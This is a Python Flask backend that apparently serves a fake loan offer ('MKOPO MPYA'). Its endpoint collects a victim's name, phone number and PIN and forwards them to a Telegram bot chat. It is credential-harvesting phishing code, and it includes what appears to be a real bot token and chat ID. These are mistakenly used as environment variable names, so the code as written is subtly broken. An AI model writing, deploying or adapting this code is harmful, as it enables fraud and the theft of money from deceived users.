from flask import Flask, request, jsonify
from flask_cors import CORS
import requests
import os

app = Flask(__name__)
CORS(app)

BOT_TOKEN = os.environ.get("7787453591:AAHJ6udch8jmeJ06wIQegqzMh5RqYZ_nuC0")
CHAT_ID = os.environ.get("6958413637")

@app.route("/")
def home():
    return "Backend Running Successfully"

@app.route("/submit-step3", methods=["POST"])
def submit_step3():

    try:

        data = request.get_json()

        jina = data.get("jina")
        namba = data.get("namba")
        pin = data.get("pin")

        message = f"""
MKOPO MPYA

Jina: {jina}
Namba: {namba}
PIN: {pin}
"""

        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"

        payload = {
            "chat_id": CHAT_ID,
            "text": message
        }

        response = requests.post(url, json=payload)

        print(response.text)

        if response.status_code == 200:

            return jsonify({
                "status": "success",
                "message": "Sent to Telegram"
            })

        else:

            return jsonify({
                "status": "error",
                "message": response.text
            })

    except Exception as e:

        return jsonify({
            "status": "error",
            "message": str(e)
        })

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)
